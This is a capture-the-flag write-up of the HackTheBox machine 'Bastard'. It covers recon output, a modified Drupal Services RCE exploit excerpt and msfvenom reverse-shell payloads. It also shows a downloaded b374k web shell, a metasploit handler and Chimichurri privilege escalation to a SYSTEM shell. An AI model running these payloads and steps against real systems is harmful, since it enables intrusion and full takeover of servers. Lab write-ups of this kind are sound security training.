# This is a write up for the machine Bastard from HackTheBox.eu

host: 10.10.10.9

Service Discovery

$ nmap -A 10.10.10.9
```
Starting Nmap 7.01 ( https://nmap.org ) at 2017–09–10 01:32 EDT
Nmap scan report for 10.10.10.9
Host is up (0.13s latency).
Not shown: 997 filtered ports
PORT STATE SERVICE VERSION
80/tcp open http Microsoft IIS httpd 7.5
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods: 
|_ Potentially risky methods: TRACE
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Welcome to 10.10.10.9 | 10.10.10.9
135/tcp open msrpc Microsoft Windows RPC
49154/tcp open msrpc Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
When we access the web server were brought to a Drupal login page... Let’s do some reconnaissance with DirBuster
```
File found: /modules — 301
File found: /misc — 301
File found: /themes — 301
File found: /search — 403
File found: /scripts — 301
File found: /user — 200
File found: /0–200
File found: /admin — 403
File found: /tag — 403
File found: /node — 200
File found: /sites — 301
File found: /template — 403
File found: /includes — 301
File found: /Search — 403
File found: /index.php — 200
Dir found: / — 200
File found: /profiles — 301
Dir found: /rest/ — 200
Dir found: /rest/0/ — 200
ERROR: http://10.10.10.9:80/rest/user/ — Return code for first HEAD, is different to the second GET: 200–403
Dir found: /rest/user/ — 200
Dir found: /rest/comment/ — 200
Dir found: /rest/node/ — 200
```

More Enumeration...
```
$ nikto -h 10.10.10.9
- Nikto v2.1.5
 — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — -
+ Target IP: 10.10.10.9
+ Target Hostname: 10.10.10.9
+ Target Port: 80
+ Start Time: 2017–09–10 01:43:45 (GMT-4)
 — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — -
+ Server: Microsoft-IIS/7.5
+ Retrieved x-powered-by header: ASP.NET
+ Uncommon header ‘x-generator’ found, with contents: Drupal 7 (http://drupal.org)
+ Uncommon header ‘x-content-type-options’ found, with contents: nosniff
+ Uncommon header ‘x-frame-options’ found, with contents: SAMEORIGIN
+ Server leaks inodes via ETags, header found with file /robots.txt, fields: 0x65e4948a9da0d21:0 
+ File/dir ‘/INSTALL.mysql.txt’ in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ File/dir ‘/INSTALL.pgsql.txt’ in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ File/dir ‘/INSTALL.sqlite.txt’ in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ File/dir ‘/install.php’ in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ File/dir ‘/LICENSE.txt’ in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ File/dir ‘/MAINTAINERS.txt’ in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Cookie SESSd873f26fc11f2b7e6e4aa0f6fce59913 created without the httponly flag
+ File/dir ‘/UPGRADE.txt’ in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ File/dir ‘/xmlrpc.php’ in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ File/dir ‘/filter/tips/’ in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ File/dir ‘/user/register/’ in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ File/dir ‘/user/password/’ in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ File/dir ‘/user/login/’ in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ File/dir ‘/?q=comment/reply/’ in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ File/dir ‘/?q=filter/tips/’ in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ File/dir ‘/?q=user/password/’ in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ File/dir ‘/?q=user/register/’ in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ File/dir ‘/?q=user/login/’ in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ “robots.txt” contains 68 entries which should be manually viewed.
+ Server banner has changed from ‘Microsoft-IIS/7.5’ to ‘Microsoft-HTTPAPI/2.0’ which may suggest a WAF, load balancer or proxy is in place
+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
+ OSVDB-44056: /sips/sipssys/users/a/admin/user: SIPS v0.2.2 allows user account info (including password) to be retrieved remotely.
+ OSVDB-9392: /userinfo.php?uid=1;: Xoops portal gives detailed error messages including SQL syntax and may allow an exploit.
+ OSVDB-27071: /phpimageview.php?pic=javascript:alert(8754): PHP Image View 1.0 is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
+ OSVDB-3931: /myphpnuke/links.php?op=MostPopular&ratenum=[script]alert(document.cookie);[/script]&ratetype=percent: myphpnuke is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
+ /modules.php?op=modload&name=FAQ&file=index&myfaq=yes&id_cat=1&categories=%3Cimg%20src=javascript:alert(9456);%3E&parent_id=0: Post Nuke 0.7.2.3-Phoenix is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
+ /modules.php?letter=%22%3E%3Cimg%20src=javascript:alert(document.cookie);%3E&op=modload&name=Members_List&file=index: Post Nuke 0.7.2.3-Phoenix is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
+ OSVDB-4598: /members.asp?SF=%22;}alert(223344);function%20x(){v%20=%22: Web Wiz Forums ver. 7.01 and below is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
+ OSVDB-2946: /forum_members.asp?find=%22;}alert(9823);function%20x(){v%20=%22: Web Wiz Forums ver. 7.01 and below is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
+ OSVDB-12184: /index.php?=PHPB8B5F2A0–3C92–11d3-A3A9–4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-3092: /README.TXT: This might be interesting…
+ OSVDB-3092: /readme.txt: This might be interesting…
+ OSVDB-3092: /user/: This might be interesting…
```

We can see that the web server is running Drupal 7 and it is vulnerable to several to XSS and possibly SQL Injection. I started looking to see if there were any Drupal exploits and I came across this https://www.ambionics.io/blog/drupal-services-module-rce

They explain in depth what the exploit does and how it works in the link above. I suggest to read it even if you’re not doing the CTF, it's a good resource to have in your infosec arsenal.

I had to modify the exploit a little to do what I wanted it to do
```
#!/usr/bin/php

<?php

# Drupal Services Module Remote Code Execution Exploit
# https://www.ambionics.io/blog/drupal-services-module-rce
# cf
#
# Three stages:
# 1. Use the SQL Injection to get the contents of the cache for current endpoint
# along with admin credentials and hash
# 2. Alter the cache to allow us to write a file and do so
# 3. Restore the cache
# Initialization

error_reporting(E_ALL);
define(‘QID’, ‘anything’);
define(‘TYPE_PHP’, ‘application/vnd.php.serialized’);
define(‘TYPE_JSON’, ‘application/json’);
define(‘CONTROLLER’, ‘user’);
define(‘ACTION’, ‘login’);
$myfile = fopen(“payload1.txt”, “r”) or die(“Unable to open file!”);
$payload1 = fread($myfile,filesize(“payload1.txt”));
$url = ‘10.10.10.9’;
$endpoint_path = ‘/rest’;
$endpoint = ‘rest_endpoint’;
$file = [
‘filename’ => ‘troll.php’,
‘data’ => $payload1];

$browser = new Browser($url . $endpoint_path);
```
The code of the exploit is around 400 lines of code, I'm not going to paste all the code here just what I modified you can read it on their website. The exploit needs a rest api path in the web server, one of the output from DirBuster was Dir found: `/rest/ — 200`
So we can set the endpoint_path variable to $endpoint_path = `‘/rest’;`once we run the the exploit we get two files 
- user.json
- session.json

user.json
```
{
 “uid”: “1”,
 “name”: “admin”,
 “mail”: “drupal@hackthebox.gr”,
 “theme”: “”,
 “created”: “1489920428”,
 “access”: “1492102672”,
 “login”: 1505051198,
 “status”: “1”,
 “timezone”: “Europe\/Athens”,
 “language”: “”,
 “picture”: null,
 “init”: “drupal@hackthebox.gr”,
 “data”: false,
 “roles”: {
 “2”: “authenticated user”,
 “3”: “administrator”},
 “rdf_mapping”: {
 “rdftype”: [
 “sioc:UserAccount”],
 “name”: {
 “predicates”: [
 “foaf:name”]},
 “homepage”: {
 “predicates”: [
 “foaf:page”],
 “type”: “rel” }
 },
 “pass”: “$S$DRYKUR0xDeqClnV5W0dnncafeE.Wi4YytNcBmmCtwOjrcH5FJSaE”
}```
session.json
```
{
 “session_name”: “SESSd873f26fc11f2b7e6e4aa0f6fce59913”,
 “session_id”: “xAmjIUH0wKeDr1QmfFsRWOs6QO_I-NpOEOkd-i3fVkU”,
 “token”: “s4iFtBwozCOf0rxIeloGaQ_KfOY1rGFOUpxNc2z5BH8”
}
```
I modified the exploit so it would read from a file and that file contained my php reverse shell.

```$myfile = fopen(“payload1.txt”, “r”) or die(“Unable to open file!”);
$payload1 = fread($myfile,filesize(“payload1.txt”));
$url = ‘10.10.10.9’;
$endpoint_path = ‘/rest’;
$endpoint = ‘rest_endpoint’;
 $file = [
 ‘filename’ => ‘ssec.php’,
 ‘data’ => $payload1];
```
I created a payload named payload1.txt and the contents of payload1.txt will be uploaded to the webserver as ssec.php
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.x.x LPORT=1234 -f raw > payload1.txt
now when I run the drupal exploit the payload is written to the web server as a php shell and we can connect to the victims system.

`$ php drupal.php

Stored session information in session.json
Stored user information in user.json
Cache contains 7 entries
File written: 10.10.10.9/ssec.php
`
Now I can catch the shell with netcat nc -lvp 1234

```Connection from [10.10.10.9] port 1234 [tcp/*] accepted (family 2, sport 49214)
dir
 Volume in drive C has no label.
 Volume Serial Number is 605B-4AAA

Directory of C:\inetpub\drupal-7.54
```
Now to get the user flag ..

```cd C:\Users\dimitris\Desktop
 Directory of C:\Users\dimitris\Desktop

19/03/2017 09:04 �� <DIR> .
 19/03/2017 09:04 �� <DIR> ..
 19/03/2017 09:06 �� 32 user.txt
 1 File(s) 32 bytes
 2 Dir(s) 31.040.098.304 bytes free
```
and we **Got The User Flag!**

> Note: when I was trying to catch the shell with metasploit, the session would die instantly I don’t know what was causing this so I moved on without metasploit and used nc instead.

I was trying to find a way to upload files to the machine so I can get a windows reverse shell but I couldn’t figure it out since the system didn't have python or netcat, so I used one of b374k’s php shell (2.7). https://raw.githubusercontent.com/BlackArch/webshells/master/php/b374k-2.7.php 

I download the file

wget -O payload1.txt https://raw.githubusercontent.com/BlackArch/webshells/master/php/b374k-2.7.php

Now payload1.txt contains the content of the b374k’s shell so if we run php drupal.php once again http://10.10.10.9/ssec.php should be a login page to the shell. The password of all b374k shells is b374k unless you change it. Which I recommend you do to prevent other users from using your shell. I created and uploaded a windows shell through the upload function in b374k’s shell
into a writeable directory. 

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.9 LPORT=4444 -f exe > ssec.exe`

```
Directory of C:\inetpub\drupal-7.54

10/09/2017 09:06 �� <DIR> .
10/09/2017 09:06 �� <DIR> ..
19/03/2017 01:42 �� 317 .editorconfig
19/03/2017 01:42 �� 174 .gitignore
19/03/2017 01:42 �� 5.969 .htaccess
19/03/2017 01:42 �� 6.604 authorize.php
19/03/2017 01:42 �� 110.781 CHANGELOG.txt
19/03/2017 01:42 �� 1.481 COPYRIGHT.txt
19/03/2017 01:42 �� 720 cron.php
19/03/2017 01:43 �� <DIR> includes
19/03/2017 01:42 �� 529 index.php
19/03/2017 01:42 �� 1.717 INSTALL.mysql.txt
19/03/2017 01:42 �� 1.874 INSTALL.pgsql.txt
19/03/2017 01:42 �� 703 install.php
19/03/2017 01:42 �� 1.298 INSTALL.sqlite.txt
19/03/2017 01:42 �� 17.995 INSTALL.txt
19/03/2017 01:42 �� 18.092 LICENSE.txt
19/03/2017 01:42 �� 8.710 MAINTAINERS.txt
19/03/2017 01:43 �� <DIR> misc
19/03/2017 01:43 �� <DIR> modules
19/03/2017 01:43 �� <DIR> profiles
19/03/2017 01:42 �� 5.382 README.txt
19/03/2017 01:42 �� 2.189 robots.txt
19/03/2017 01:43 �� <DIR> scripts
19/03/2017 01:43 �� <DIR> sites
10/09/2017 09:06 �� 73.802 ssec.exe
10/09/2017 08:58 �� 57.538 ssec.php
19/03/2017 01:43 �� <DIR> themes
19/03/2017 01:42 �� 19.986 update.php
19/03/2017 01:42 �� 10.123 UPGRADE.txt
19/03/2017 01:42 �� 2.200 web.config
19/03/2017 01:42 �� 417 xmlrpc.php
 23 File(s) 348.601 bytes
 9 Dir(s) 31.039.807.488 bytes free
```
I prepared a metasploit handler to receive the incoming windows shell.

`use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <yourip>
set LPORT <4444>
set ExitOnSession false
exploit -j -z`

I executed ssec.exe through b374k’s terminal and got a meterpreter shell.

```
meterpreter > sysinfo 
Computer : BASTARD
OS : Windows 2008 R2 (Build 7600).
Architecture : x64
System Language : el_GR
Domain : HTB
Logged On Users : 0
Meterpreter : x86/windows
```
Now that we have a meterpreter shell we can use exploit suggester for possible privilege scalation on the windows box.  

meterpreter > run post/multi/recon/local_exploit_suggester
```
[*] 10.10.10.9 — Collecting local exploits for x86/windows…
[*] 10.10.10.9–37 exploit checks are being tried…
[+] 10.10.10.9 — exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.9 — exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.9 — exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.10.9 — exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.9 — exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.9 — exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.9 — exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target service is running, but could not be validated.
[+] 10.10.10.9 — exploit/windows/local/ms_ndproxy: The target service is running, but could not be validated.
[+] 10.10.10.9 — exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
```
We got quite a few exploits we could use but only one of them looks promising, ms16_032_secondary logon_handle_privesc. 
I tried it but that exploit only works if another user logged in as Administrator and in this case no one was logging in.
```
[*] Started reverse TCP handler on 10.10.x.x:4444 
[*] Writing payload file, C:\Users\Public\Documents\test\XEfKVo.txt…
[*] Compressing script contents…
[+] Compressed size: 3588
[*] Executing exploit script…
[*] Exploit completed, but no session was created.
```
I kept digging the inter-webs and came across this exploit on github https://github.com/Re4son/Chimichurri/

Now that we have a meterpreter shell we can use the upload function built in metasploit. I uploaded Chimichurri.exe to `C:\inetpub\drupal-7.54\`

Started a netcat listener on my host machine

```
$ nc -lvp 5555
Listening on [0.0.0.0] (family 0, port 5555)
```
and on metasploit I ran Chimichurri.exe <my ip> 5555
I got another shell but this time as root.

```
Connection from [10.10.10.9] port 5555 [tcp/*] accepted (family 2, sport 49314)
Microsoft Windows [Version 6.1.7600]
Copyright © 2009 Microsoft Corporation. All rights reserved.

cd C:\Users\Administrator\Desktop

Directory of C:\Users\Administrator\Desktop

19/03/2017 08:33 �� <DIR> .
19/03/2017 08:33 �� <DIR> ..
19/03/2017 08:34 �� 32 root.txt.txt
 1 File(s) 32 bytes
 2 Dir(s) 31.039.451.136 bytes free
```
and we **Got The Root Flag!**


<a href="https://imgflip.com/gif/1zsvkv"><img src="https://i.imgflip.com/1zsvkv.gif" title="made at imgflip.com"/></a>

Overall I really enjoyed this box it was simple and fun box. I’m happy to announce that this my very first writeup I’ve ever done.
